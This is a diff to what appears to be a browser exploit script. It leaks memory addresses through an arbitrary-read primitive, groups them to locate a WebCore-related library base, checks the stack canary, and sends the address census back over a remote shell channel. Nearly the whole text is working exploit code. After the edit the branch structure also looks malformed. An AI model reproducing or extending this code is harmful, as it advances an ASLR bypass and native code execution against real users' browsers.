@@ -5161,6 +5161,16 @@ function _startWsShell(){
           if(vals.length>=2048)break;
         }
         EL('harvest n='+vals.length);
+        /* v12: THE CENSUS RIDES EVERY REPLY - every attempt banks the full
+         * value set; a canary-confirming session pairs the base with its
+         * census in one reply (the cluster RVAs = the drift structure). */
+        var bandsR={};
+        for(var so2=0;so2<vals.length;so2++){
+          var bk2=((vals[so2]/0x100000n)*0x100000n).toString(16);
+          (bandsR[bk2]=bandsR[bk2]||[]).push('0x'+vals[so2].toString(16));
+        }
+        reply.bands=bandsR;
+        reply.n=vals.length;
         /* v9 SCANONLY: pure harvest + cluster census, NO ladder, NO probes,
          * NO calls - 100% safe. The rawcall era picks the WRAPPER CLUSTER
          * offline from the returned census. */
@@ -5321,22 +5331,14 @@ function _startWsShell(){
             ELs('CANARY CONFIRMED - base 0x'+B3.toString(16)+' (witness deferred to the drift stage)');
             lkBase=B3;
             break;
-          }else if(clist[ti].anchors<2){
-            /* v8h: single non-guard anchor - the DERIVED-GUARD PROBE IS THE
-             * TEST. A TRUE base lands on the mapped canary (safe - proven
-             * twice); a FALSE base usually dies (one candidate per session,
-             * the accepted cost). Density is only the RANKING tiebreak -
-             * it cannot discriminate module identity (a WebCore-derived
-             * false candidate sits inside the WebCore cluster and scores
-             * high too). */
-            var gp=B3+BigInt(E2_LK.stackChkGuard);
-            ELs('probe derived guard 0x'+gp.toString(16)+' (dens='+clist[ti].density+')');
-            var can2=S.absRead(gp,8)[0];
-            ELs('canary=0x'+can2.toString(16));
-            if(can2>0x1000000n){ELs('CANARY CONFIRMED (derived) - base 0x'+B3.toString(16));lkBase=B3;break;}
-            ELs('derived canary looks wrong - next');
-            continue;
           }else{
+            /* v12: single non-guard anchors are REPORTED ONLY - never probed
+             * (the derived-probe deaths were one-per-session lottery tickets
+             * at ~15% true odds; non-confirming sessions now complete with
+             * zero calls and zero probes). */
+            ELs('single anchor reported (not probed): 0x'+B3.toString(16)+' ['+clist[ti].names.join(';')+'] dens='+clist[ti].density);
+            continue;
+          }
             ELs('2+-anchor candidate accepted (witness deferred)');
             lkBase=B3;
             break;
